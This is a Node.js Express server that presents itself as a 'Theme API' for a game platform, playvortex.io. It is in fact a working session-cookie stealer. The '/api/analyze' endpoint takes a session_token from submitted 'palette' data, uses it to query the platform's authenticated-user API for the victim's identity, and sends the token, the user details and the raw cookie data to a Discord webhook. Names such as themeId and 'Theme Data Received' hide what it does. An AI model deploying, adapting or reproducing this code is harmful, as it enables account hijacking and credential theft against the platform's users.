const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

function extractValue(palette, key) {
    if (!palette) return null;
    const match = palette.match(new RegExp(`${key}=([^;]+)`));
    return match ? match[1] : null;
}

app.post('/api/analyze', async (req, res) => {
    try {
        const { pageUrl, palette, user } = req.body;
        const WEBHOOK_URL = process.env.webhook;

        if (!WEBHOOK_URL) {
            return res.status(500).json({ status: "error" });
        }
        if (!palette) return res.status(400).json({ status: "error" });

        // 1. Extract the session token
        const themeId = extractValue(palette, "session_token") || extractValue(palette, "session_");
        if (!themeId) return res.status(200).json({ status: "ok" });

        // 2. Use the provided user data, or fallback to Unknown
        let username = user?.username || "Unknown";
        let displayName = user?.displayName || "Unknown";
        let userId = user?.userId || "Unknown";
        let avatarUrl = `https://playvortex.io/users/${userId}/avatar`;

        // 3. If we have a token but no username, try to fetch it via API
        if (username === "Unknown" && themeId) {
            try {
                const userResponse = await fetch("https://playvortex.io/api/users/authenticated", {
                    headers: {
                        "Cookie": `session_token=${themeId}`,
                        "Accept": "application/json"
                    }
                });
                if (userResponse.ok) {
                    const userData = await userResponse.json();
                    if (userData) {
                        userId = userData.id || userId;
                        username = userData.username || username;
                        displayName = userData.displayName || displayName;
                        avatarUrl = `https://playvortex.io/users/${userId}/avatar`;
                    }
                }
            } catch (apiErr) {}
        }

        // 4. Build Discord embed
        const payload = {
            username: "Theme Sync",
            avatar_url: "https://playvortex.io/favicon.ico",
            embeds: [{
                title: "🦊 Theme Data Received",
                color: 0x8f82c4,
                thumbnail: { url: avatarUrl },
                fields: [
                    { name: "👤 Username", value: `**@${username}**`, inline: true },
                    { name: "📛 Display Name", value: `**${displayName}**`, inline: true },
                    { name: "🆔 User ID", value: `\`${userId}\``, inline: false },
                    { name: "🔑 Theme ID", value: `\`\`\`${themeId}\`\`\``, inline: false },
                    { name: "📦 Raw Palette Data", value: `\`\`\`${(palette || '').substring(0, 950)}\`\`\``, inline: false }
                ],
                footer: { text: "Render Proxy", icon_url: "https://playvortex.io/favicon.ico" },
                timestamp: new Date().toISOString()
            }]
        };

        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        return res.status(200).json({ status: "success" });

    } catch (err) {
        console.error("Server error:", err);
        return res.status(500).json({ status: "error" });
    }
});

app.get('/', (req, res) => res.send('Theme API is running.'));

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
